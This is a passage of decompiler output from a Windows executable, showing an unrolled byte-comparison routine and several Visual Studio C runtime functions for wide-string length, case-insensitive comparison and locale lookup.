        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_d:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xd));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xd))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 10)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 10));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_9:
    if (*(int *)((int)_Buf1 + (_Size - 9)) == *(int *)((int)_Buf2 + (_Size - 9))) {
      iVar2 = 0;
    }
    else {
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 8));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 7));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 6)) - (uint)*(byte *)((int)_Buf2 + (_Size - 6));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_5:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 5));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 5))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 4));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 2)) - (uint)*(byte *)((int)_Buf2 + (_Size - 2));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
LAB_0041211b:
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_1:
    uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 1));
    uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 1));
    if (uVar3 == uVar1) {
      return 0;
    }
    return (uint)(0 < (int)(uVar3 - uVar1)) * 2 + -1;
  case 0x1e:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1e));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1e))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1e));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1d));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_1a:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1a));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1a))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_16:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x16));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x16))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_12:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x12));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x12))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_e:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xe));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xe))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_a:
    if (*(int *)((int)_Buf1 + (_Size - 10)) == *(int *)((int)_Buf2 + (_Size - 10))) {
      iVar2 = 0;
    }
    else {
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 8));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 8));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 7)) - (uint)*(byte *)((int)_Buf2 + (_Size - 7));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_6:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 6));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 6))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 5));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 4));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 4));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 3)) - (uint)*(byte *)((int)_Buf2 + (_Size - 3));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_2:
    if (*(short *)((int)_Buf1 + (_Size - 2)) != *(short *)((int)_Buf2 + (_Size - 2))) {
LAB_004129bf:
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 2));
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 2));
      if (uVar3 == uVar1) goto switchD_004118f2_caseD_1;
      iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1;
      goto LAB_0041211b;
    }
    goto switchD_004118f2_caseD_0;
  case 0x1f:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1f));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1f))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1f));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1e));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1e));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1d));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_1b:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1b));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1b))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x18));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_17:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x17));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x17))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_13:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0x13));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x13))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_f:
    if (*(int *)((int)_Buf1 + (_Size - 0xf)) == *(int *)((int)_Buf2 + (_Size - 0xf))) {
      iVar2 = 0;
    }
    else {
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xf));
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc)) -
              (uint)*(byte *)((int)_Buf2 + (_Size - 0xc));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_b:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 0xb));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xb))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 10));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 9));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 8)) - (uint)*(byte *)((int)_Buf2 + (_Size - 8));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_7:
    uVar1 = *(uint *)((int)_Buf1 + (_Size - 7));
    if (uVar1 == *(uint *)((int)_Buf2 + (_Size - 7))) {
      iVar2 = 0;
    }
    else {
      uVar1 = uVar1 & 0xff;
      uVar3 = (uint)*(byte *)((int)_Buf2 + (_Size - 7));
      if ((uVar1 != uVar3) &&
         (iVar2 = (uint)(uVar1 != uVar3 && -1 < (int)(uVar1 - uVar3)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 6));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 6));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 5));
      uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 5));
      if ((uVar3 != uVar1) &&
         (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
        return iVar2;
      }
      iVar2 = (uint)*(byte *)((int)_Buf1 + (_Size - 4)) - (uint)*(byte *)((int)_Buf2 + (_Size - 4));
      if (iVar2 != 0) {
        iVar2 = (uint)(0 < iVar2) * 2 + -1;
      }
    }
    if (iVar2 != 0) {
      return iVar2;
    }
switchD_004118f2_caseD_3:
    uVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3));
    uVar1 = (uint)*(byte *)((int)_Buf2 + (_Size - 3));
    if ((uVar3 != uVar1) &&
       (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
      return iVar2;
    }
    goto LAB_004129bf;
  }
}



// Library Function - Single Match
//  _wcsnlen
// 
// Library: Visual Studio 2012 Release

size_t __cdecl _wcsnlen(wchar_t *_Src,size_t _MaxCount)

{
  uint uVar1;
  
  uVar1 = 0;
  if (_MaxCount != 0) {
    do {
      if (*_Src == L'\0') {
        return uVar1;
      }
      uVar1 = uVar1 + 1;
      _Src = _Src + 1;
    } while (uVar1 < _MaxCount);
  }
  return uVar1;
}



// Library Function - Multiple Matches With Different Base Names
//  int __cdecl GetTableIndexFromLocaleName(wchar_t const *)
//  int __cdecl ATL::_AtlGetTableIndexFromLocaleName(wchar_t const *)
//  _GetTableIndexFromLocaleName
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined4 __cdecl FID_conflict_GetTableIndexFromLocaleName(wchar_t *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = 0;
  iVar2 = 0xe3;
  do {
    iVar3 = (iVar2 + iVar4) / 2;
    iVar1 = __wcsnicmp(param_1,*(wchar_t **)(iVar3 * 8 + 0x416578),0x55);
    if (iVar1 == 0) {
      return *(undefined4 *)(iVar3 * 8 + 0x41657c);
    }
    if (iVar1 < 0) {
      iVar2 = iVar3 + -1;
    }
    else {
      iVar4 = iVar3 + 1;
    }
  } while (iVar4 <= iVar2);
  return 0xffffffff;
}



// Library Function - Multiple Matches With Different Base Names
//  unsigned long __cdecl ATL::_AtlDownlevelLocaleNameToLCID(wchar_t const *)
//  ___acrt_DownlevelLocaleNameToLCID
//  ___crtDownlevelLocaleNameToLCID
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined4 __cdecl FID_conflict__AtlDownlevelLocaleNameToLCID(wchar_t *param_1)

{
  uint uVar1;
  
  if (param_1 != (wchar_t *)0x0) {
    uVar1 = FID_conflict_GetTableIndexFromLocaleName(param_1);
    if ((-1 < (int)uVar1) && (uVar1 < 0xe4)) {
      return *(undefined4 *)(&DAT_00415e58 + uVar1 * 8);
    }
  }
  return 0;
}



void __cdecl
FUN_00412c14(wchar_t *param_1,DWORD param_2,LPCWSTR param_3,int param_4,LPWSTR param_5,int param_6)

{
  LCID Locale;
  
  if ((code *)(DAT_0041e00c ^ DAT_0041a038) != (code *)0x0) {
    (*(code *)(DAT_0041e00c ^ DAT_0041a038))(param_1,param_2,param_3,param_4,param_5,param_6,0,0,0);
    return;
  }
  Locale = FID_conflict__AtlDownlevelLocaleNameToLCID(param_1);
  LCMapStringW(Locale,param_2,param_3,param_4,param_5,param_6);
  return;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2019 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  wchar_t wVar1;
  int iVar2;
  wchar_t wVar3;
  
  iVar2 = 0;
  if (_MaxCount != 0) {
    iVar2 = (int)_Str1 - (int)_Str2;
    do {
      wVar3 = *(wchar_t *)(iVar2 + (int)_Str2);
      if ((0x40 < (ushort)wVar3) && ((ushort)wVar3 < 0x5b)) {
        wVar3 = wVar3 + L' ';
      }
      wVar1 = *_Str2;
      if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
        wVar1 = wVar1 + L' ';
      }
      _Str2 = _Str2 + 1;
      _MaxCount = _MaxCount - 1;
    } while (((_MaxCount != 0) && (wVar3 != L'\0')) && (wVar3 == wVar1));
    iVar2 = (uint)(ushort)wVar3 - (uint)(ushort)wVar1;
